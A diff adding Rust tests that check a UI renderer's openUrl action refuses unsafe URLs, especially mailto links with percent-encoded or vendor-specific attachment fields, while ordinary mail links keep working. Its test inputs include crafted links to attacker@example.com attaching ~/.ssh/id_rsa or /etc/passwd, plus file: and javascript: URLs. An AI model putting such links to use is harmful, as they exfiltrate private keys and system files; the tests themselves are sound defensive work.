@@ -665,6 +665,146 @@ fn open_url_refuses_a_scheme_the_host_should_not_launch() {
     }
 }
 
+/// A `mailto:` header field is percent-encoded on the wire, and the
+/// blocklist compared the *raw* name.
+///
+/// RFC 6068 spells `hfname` as `*qchar`, and `qchar` includes
+/// `pct-encoded`; a conforming client percent-decodes the name before
+/// acting on it. So `%61ttach` is `attach` by the time it reaches the mail
+/// client, and it sailed past a check comparing it to the literal string
+/// `"attach"`. The same hole swallowed every vendor spelling nobody had
+/// thought to enumerate.
+///
+/// The fix is the one `OPENABLE_SCHEMES` already makes for schemes: the set
+/// of header fields a mail client will act on is open-ended, so name the
+/// few that are safe rather than the ones that are known to be dangerous.
+#[test]
+fn open_url_refuses_mailto_fields_that_are_not_plainly_safe() {
+    for url in [
+        // Percent-encoded, and therefore invisible to a literal comparison.
+        "mailto:attacker@example.com?%61ttach=/Users/u/.ssh/id_rsa",
+        "mailto:attacker@example.com?%41TTACHMENT=/etc/passwd",
+        "mailto:attacker@example.com?subject=hi&%61ttachment=/etc/passwd",
+        // A vendor spelling the old blocklist never enumerated. There is no
+        // finite list of these, which is the whole argument for an allowlist.
+        "mailto:attacker@example.com?x-mozilla-attach=/etc/passwd",
+        "mailto:attacker@example.com?attachurl=file:///etc/passwd",
+    ] {
+        let stream = format!(
+            r#"[
+            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
+            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
+                {{"id":"root","component":"Button","child":"lbl",
+                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
+                {{"id":"lbl","component":"Text","text":"Mail"}}
+            ]}}}}
+        ]"#
+        );
+        let rendered = apply(&stream)
+            .surface("s")
+            .expect("surface")
+            .render(&Theme::light());
+        assert!(
+            rendered
+                .notes
+                .iter()
+                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
+            "{url} must be refused, got: {:?}",
+            rendered.notes
+        );
+        assert!(
+            find_click(&rendered.element).is_none(),
+            "{url} left a live control that could reach the opener"
+        );
+    }
+}
+
+/// And the header fields a generated link legitimately uses keep working —
+/// an allowlist that blocked ordinary mail links would just get removed.
+#[test]
+fn open_url_still_composes_ordinary_mail() {
+    for url in [
+        "mailto:someone@example.com?subject=Hello%20there",
+        "mailto:someone@example.com?subject=Report&body=See%20attached%20link",
+        "mailto:a@example.com?cc=b@example.com&bcc=c@example.com",
+        "mailto:someone@example.com?in-reply-to=%3Cabc@example.com%3E",
+        // Empty query, and a bare address with a trailing '?'.
+        "mailto:someone@example.com?",
+    ] {
+        let stream = format!(
+            r#"[
+            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
+            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
+                {{"id":"root","component":"Button","child":"lbl",
+                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
+                {{"id":"lbl","component":"Text","text":"Mail"}}
+            ]}}}}
+        ]"#
+        );
+        let mut client = apply(&stream);
+        let surface = client.surface_mut("s").expect("surface");
+        let rendered = surface.render(&Theme::light());
+        assert!(
+            !rendered
+                .notes
+                .iter()
+                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
+            "{url} is an ordinary mail link, got: {:?}",
+            rendered.notes
+        );
+        let msg = find_click(&rendered.element).expect("the link is clickable");
+        assert!(
+            surface
+                .handle(msg)
+                .iter()
+                .any(|s| matches!(s, A2uiSignal::OpenUrl(u) if u == url)),
+            "{url} must reach the host"
+        );
+    }
+}
+
+/// `A2uiSignal::OpenUrl` tells its reader the URL is safe to hand to a
+/// platform opener. That has to be true of every one the host can receive,
+/// not only of the ones this renderer happened to construct.
+///
+/// `A2uiMsg` is public, so a host can hold one it built itself, replayed
+/// from a log, or round-tripped through its own message type, and hand it
+/// straight to `handle`. Checking only where the action is resolved makes
+/// the guarantee a property of today's call graph rather than of the type.
+#[test]
+fn a_handed_in_open_url_is_checked_before_it_becomes_a_signal() {
+    let stream = r#"[
+        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
+        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
+            {"id":"root","component":"Text","text":"hi"}
+        ]}}
+    ]"#;
+    for url in [
+        "file:///etc/passwd",
+        "javascript:alert(1)",
+        "mailto:a@example.com?attach=/etc/passwd",
+        "mailto:a@example.com?%61ttach=/etc/passwd",
+    ] {
+        let mut client = apply(stream);
+        let surface = client.surface_mut("s").expect("surface");
+        let signals = surface.handle(A2uiMsg::OpenUrl(url.to_owned()));
+        assert!(
+            signals.is_empty(),
+            "{url} reached the host as {signals:?}, but the signal promises a \
+             scheme the host may launch"
+        );
+        assert!(
+            surface
+                .notes()
+                .iter()
+                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
+            "refusing {url} silently is the failure this crate exists not to have, \
+             got: {:?}",
+            surface.notes()
+        );
+    }
+}
+
 /// One cause, one diagnosis. A blocked scheme records why the control is
 /// dead; the generic "no action it can carry out" note is a vaguer
 /// restatement of the same fact and must not accompany it.
